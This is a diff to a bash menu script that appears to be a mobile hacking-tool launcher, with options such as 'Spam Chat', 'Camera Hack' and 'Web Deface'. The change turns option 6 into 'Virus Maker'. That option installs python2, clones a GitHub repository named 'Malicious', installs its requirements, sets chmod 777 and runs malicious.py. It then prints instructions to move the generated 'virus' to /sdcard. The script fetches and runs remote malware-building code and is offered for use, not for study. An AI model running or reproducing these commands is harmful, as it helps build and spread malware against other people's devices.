@@ -60,7 +60,7 @@ echo $cy "[2]"$i" Spam Chat"
 echo $cy "[3]"$me" Skull Project"
 echo $cy "[4]"$ku" Alice"
 echo $cy "[5]"$pur" SPY"
-echo $cy "[6]"$pu" Trap Project"
+echo $cy "[6]"$pu" Virus Maker"
 echo $cy "[7]"$cy" Camera Hack"
 echo $cy "[8]"$me" Web Deface"
 echo $cy "[9]"$pu" EXIT"
@@ -115,9 +115,19 @@ fi
 if [ $pil = 6 ]
 then
 clear
-git clone https://github.com/zlucifer/trap_project
-cd trap_project
-bash trap.sh
+echo $me "AFTER DONE,U NEED TO DO cd Android"
+echo $me "AND MOVE IT TO SDCARD USING mv (VIRUS NAME) /sdcard"
+echo $me "xEHx Here.."
+sleep 13
+pkg install python2
+git clone https://github.com/Mr-xDODOL/Malicious
+cd Malicious
+unzip Malicious
+cd Malicious
+pip2 install -r requirements.txt
+pip2 install tqdm
+chmod 777 malicious.py
+python2 malicious.py
 fi
 
 if [ $pil = 7 ]
